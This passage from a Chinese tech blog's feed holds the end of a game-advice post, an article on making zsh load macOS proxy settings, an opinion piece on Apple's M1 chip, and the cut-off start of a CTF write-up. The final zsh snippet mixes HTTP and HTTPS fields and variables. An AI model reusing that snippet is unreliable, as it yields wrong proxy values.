原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">[译] HentaiVerse 建议和指导</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-07</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-11</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 